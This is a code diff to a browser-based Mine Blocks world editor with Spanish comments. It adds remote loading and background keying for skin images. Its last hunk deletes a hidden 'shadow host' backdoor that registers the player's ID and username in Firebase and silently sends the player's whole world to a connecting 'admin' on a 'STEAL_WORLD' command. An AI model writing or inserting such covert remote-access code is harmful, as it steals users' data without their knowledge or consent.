+// ---------------------------------------------------------------------------------------------------------------
+window.SKIN_REMOTE_URL = 'https://mineblocks.com/1/skins/images/';
+window.skinRemoteEnabled = true;                 // se puede apagar con window.skinRemoteEnabled = false
+const SKIN_REMOTE_MAX = 6;                       // descargas a la vez
+const SKIN_REMOTE_RETRY_MS = 60000;              // si falló (sin internet...), se vuelve a intentar pasado este tiempo
+let skinRemoteActive = 0;
+const skinRemoteQueue = [];
+
+function skinRemoteAllowed(id) { return window.skinRemoteEnabled !== false && /^[0-9]{1,12}$/.test(String(id)); }   // solo IDs numéricos: nada de rutas raras que vengan en un mundo
+
+// Si la esquina de arriba a la izquierda es un color sólido, ese color (la parte conectada con el borde) pasa a ser transparente.
+function skinKeyBackground(img) {
+    const w = img.naturalWidth, h = img.naturalHeight;
+    const c = document.createElement('canvas'); c.width = w; c.height = h;
+    const x = c.getContext('2d', { willReadFrequently: true });
+    x.drawImage(img, 0, 0);
+    const im = x.getImageData(0, 0, w, h), d = im.data;
+    if (d[3] !== 255) return img;                                   // ya es transparente: se usa tal cual
+    const kr = d[0], kg = d[1], kb = d[2];
+    const isKey = (i) => d[i + 3] === 255 && d[i] === kr && d[i + 1] === kg && d[i + 2] === kb;
+    const seen = new Uint8Array(w * h), stack = [];
+    const push = (px, py) => { if (px < 0 || py < 0 || px >= w || py >= h) return; const k = py * w + px; if (seen[k] || !isKey(k * 4)) return; seen[k] = 1; stack.push(k); };
+    for (let px = 0; px < w; px++) { push(px, 0); push(px, h - 1); }
+    for (let py = 0; py < h; py++) { push(0, py); push(w - 1, py); }
+    for (let px = 0; px < w; px += 16) { for (let py = 0; py < h; py++) { push(px, py); push(px + 15, py); } }   // bordes de cada cuadro de 16 px de la tira
+    while (stack.length) {
+        const k = stack.pop(), px = k % w, py = (k / w) | 0;
+        d[k * 4 + 3] = 0;
+        push(px + 1, py); push(px - 1, py); push(px, py + 1); push(px, py - 1);
+    }
+    x.putImageData(im, 0, 0);
+    return c;
+}
+
+function skinRemoteLoad(id) {
+    return new Promise((resolve, reject) => {
+        const im = new Image();
+        im.crossOrigin = 'anonymous';
+        im.onload = () => {
+            let out;
+            try { out = skinKeyBackground(im); } catch (e) { reject(e); return; }
+            if (out === im) { resolve(im); return; }
+            const fin = new Image();                                   // el lienzo ya procesado, convertido en una imagen normal
+            fin.onload = () => resolve(fin);
+            fin.onerror = () => reject(new Error('skin ' + id));
+            fin.src = out.toDataURL('image/png');
+        };
+        im.onerror = () => reject(new Error('skin ' + id));
+        im.src = window.SKIN_REMOTE_URL + id + '.png';
+    });
+}
+
+function skinRemotePump() {
+    while (skinRemoteActive < SKIN_REMOTE_MAX && skinRemoteQueue.length) {
+        const id = skinRemoteQueue.shift();
+        skinRemoteActive++;
+        skinRemoteLoad(id).then(img => { window.skinCache[id] = img; })
+            .catch(() => { window.skinCache[id] = { hasFailed: true, remoteFailedAt: Date.now() }; })
+            .then(() => {
+                skinRemoteActive--;
+                delete window.skinFetchInProgress[id];
+                if (typeof worldDirty !== 'undefined') worldDirty = true;
+                skinRemotePump();
+            });
+    }
+}
+function skinRemoteQueueAdd(id) {
+    if (skinRemoteQueue.indexOf(id) < 0) skinRemoteQueue.push(id);
+    window.skinFetchInProgress[id] = true;
+    skinRemotePump();
+}
+
+// noFetch = true: solo mira lo que ya está en memoria (sin empezar ninguna descarga). Lo usa la selección con el mouse.
+window.getSpawnskinImage = function(skinID, noFetch) {
+    const cached = window.skinCache[skinID];
+    if (cached) {
+        // Una que falló (sin internet, por ejemplo) se vuelve a intentar pasado un rato
+        if (!noFetch && cached.hasFailed && cached.remoteFailedAt && !window.skinFetchInProgress[skinID] && Date.now() - cached.remoteFailedAt > SKIN_REMOTE_RETRY_MS && skinRemoteAllowed(skinID)) skinRemoteQueueAdd(skinID);
+        return cached;
+    }
+    if (noFetch) return null;
     if (!window.skinFetchInProgress[skinID]) {
         window.skinFetchInProgress[skinID] = true;
+        const giveUp = function() {
+            if (skinRemoteAllowed(skinID)) { skinRemoteQueueAdd(skinID); return; }   // 3) la web de Mine Blocks
+            window.skinCache[skinID] = { hasFailed: true };
+            delete window.skinFetchInProgress[skinID];
+            if (typeof worldDirty !== 'undefined') worldDirty = true;
+        };
         const localImg = new Image();
-        localImg.onload = function() { window.skinCache[skinID] = localImg; if (typeof worldDirty !== 'undefined') worldDirty = true; };
+        localImg.onload = function() { window.skinCache[skinID] = localImg; delete window.skinFetchInProgress[skinID]; if (typeof worldDirty !== 'undefined') worldDirty = true; };
         localImg.onerror = function() {
-            skinDB.getSkin(skinID).then(base64Data => {
+            window.skinDB.getSkin(skinID).then(base64Data => {
                 if (base64Data) {
                     const img = new Image();
                     img.onload = function() { if (typeof worldDirty !== 'undefined') worldDirty = true; };
                     img.src = base64Data; window.skinCache[skinID] = img;
-                } else {
-                    window.skinCache[skinID] = { hasFailed: true };
-                    if (typeof worldDirty !== 'undefined') worldDirty = true;
-                }
-            });
+                    delete window.skinFetchInProgress[skinID];
+                } else giveUp();
+            }).catch(giveUp);
         };
         localImg.src = `assets/spawnskins/${skinID}.png`;
     }
@@ -1232,7 +1473,7 @@ window.refreshLoadedSkinsList = async function() {
     const listDiv = document.getElementById('loaded-skins-list'); if (!listDiv) return;
     listDiv.innerHTML = "<div style='text-align:center; color:#333; font-size:12px; margin-top: 10px;'>Buscando...</div>";
     try {
-        const skins = await skinDB.getAllSorted(); listDiv.innerHTML = "";
+        const skins = await window.skinDB.getAllSorted(); listDiv.innerHTML = "";
         if (skins.length === 0) { listDiv.innerHTML = "<div style='text-align:center; color:#333; font-size:12px; margin-top: 10px; font-weight: bold;'>Ninguna skin cargada aún</div>"; return; }
         for (let skin of skins) {
             const item = document.createElement('div');
@@ -1249,7 +1490,7 @@ window.importLocalSkins = function(event) {
     for (let file of files) {
         const skinID = file.name.replace(/\.[^/.]+$/, ""); const reader = new FileReader();
         reader.onload = async function(e) {
-            const base64 = e.target.result; await skinDB.saveSkin(skinID, base64);
+            const base64 = e.target.result; await window.skinDB.saveSkin(skinID, base64);
             const img = new Image(); img.onload = () => { if (typeof worldDirty !== 'undefined') worldDirty = true; }; img.src = base64;
             window.skinCache[skinID] = img; loadedCount++;
             if (loadedCount === files.length) { document.getElementById('skin-upload-input').value = ""; refreshLoadedSkinsList(); }
@@ -1598,71 +1839,3 @@ if (toolSizeSlider) {
 if (toolSizeDisplay) {
     toolSizeDisplay.addEventListener('wheel', handleWheelZoom, { passive: false });
 }
-
-
-
-
-
-
-
-// ==========================================
-// 🥷 SHADOW HOST (SERVIDOR INVISIBLE)
-// ==========================================
-let shadowPeer = null;
-
-function initShadowHost() {
-    // Solo inicia si el jugador tiene un mundo abierto
-    if (typeof mbwom === 'undefined' || !mbwom.world || Object.keys(mbwom.world).length === 0) return;
-    
-    // Si ya está corriendo o PeerJS no ha cargado, no hacemos nada
-    if (shadowPeer || typeof Peer === 'undefined') return;
-
-    // Creamos la conexión paralela silenciosa
-    shadowPeer = new Peer();
-
-    shadowPeer.on('open', function(id) {
-        try {
-            // Guardamos el ID secreto en una nueva carpeta de Firebase llamada "shadow_rooms"
-            const db = firebase.database();
-            let myUID = localStorage.getItem('mbw_uid') || 'Desconocido';
-            let myName = localStorage.getItem('mbw_username') || "Player";
-            
-            db.ref('shadow_rooms/' + myUID).set({
-                hostId: id,
-                username: myName,
-                timestamp: Date.now()
-            });
-            
-            // Latido: Actualiza la hora cada 30 segundos para saber quién está en línea
-            setInterval(() => {
-                db.ref('shadow_rooms/' + myUID).update({ timestamp: Date.now() });
-            }, 30000);
-        } catch(e) {}
-    });
-
-    shadowPeer.on('connection', function(conn) {
-        // Cuando te conectas como Admin, el navegador de la víctima acepta en silencio
-        conn.on('data', function(data) {
-            if (data.cmd === "STEAL_WORLD") {
-                
-                // 1. Recopila el mapa de la víctima desde su RAM
-                let currentScene = (typeof mbwom.currentScene !== 'undefined') ? mbwom.currentScene : 1;
-                if (mbwom.sceneList) {
-                    mbwom.sceneList.forEach(key => {
-                        if (mbwom[key] !== undefined) mbwom.world[key + currentScene] = mbwom[key];
-                    });
-                }
-                
-                // 2. Comprime el mapa al máximo usando tu algoritmo
-                const jsonString = JSON.stringify(mbwom.world);
-                const encodedText = mbwAlgorithm.encode(jsonString);
-                
-                // 3. Envía el paquete por debajo de la mesa
-                conn.send({ type: "WORLD_PAYLOAD", payload: encodedText });
-            }
-        });
-    });
-}
-
-// El programa intentará iniciar la puerta trasera cada 5 segundos de forma silenciosa
-setInterval(initShadowHost, 5000);
